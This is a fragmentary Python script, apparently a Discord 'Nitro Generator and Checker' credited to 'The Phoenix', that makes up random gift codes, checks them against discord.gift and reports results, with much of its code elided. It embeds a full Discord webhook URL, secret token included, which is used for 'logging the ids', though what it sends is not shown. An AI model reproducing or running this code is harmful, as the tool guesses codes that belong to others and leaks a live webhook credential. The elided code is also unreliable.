...
DiscordWebhook(  # Let the user know it has started logging the ids
        url="https://discord.com/api/webhooks/1239277190856704010/3ilDqWTzW8a-oB6eQg9WK2HSwkQl24w6uV8hcSpCv1XLpPQcOVNwe9zwd5DzHePT6yVt",
    ...
    def main(self):  # The main function contains the most important code
        ...
        if os.name == "nt":  # If the system is windows
            ...
            ctypes.windll.kernel32.SetConsoleTitleW(
                "Nitro Generator and Checker - Made by The Phoenix")  # Change the
        else:  # Or if it is unix
            print(f'\33]0;Nitro Checker and Generator - Made by The Phoenix\a',
                  end='', flush=True)  # Update title of command prompt

        self.slowType("Made by: The Phoenix", .02)
        ...
        for s in c:  # Loop over the amount of codes to check
            try:
                ...
                url = f"https://discord.gift/{code} || Tool by The Phoenix ✅"  # Generate the url
            ...
            if os.name == "nt":  # If the system is windows
                ...
                # Change the title
                print(
                    f'\33]0;Nitro Checker and Generator - 0 Valid | {invalid} Invalid - Made by The Phoenix\a', end='', flush=True)

        print(f"""
Results:
 Valid: 0
 Invalid: {invalid}
 Valid Codes: None""")  # Give a report of the results of the check

        # Tell the user the program finished
        input("\nThe end! Press Enter 5 times to close the program. Thanks!")
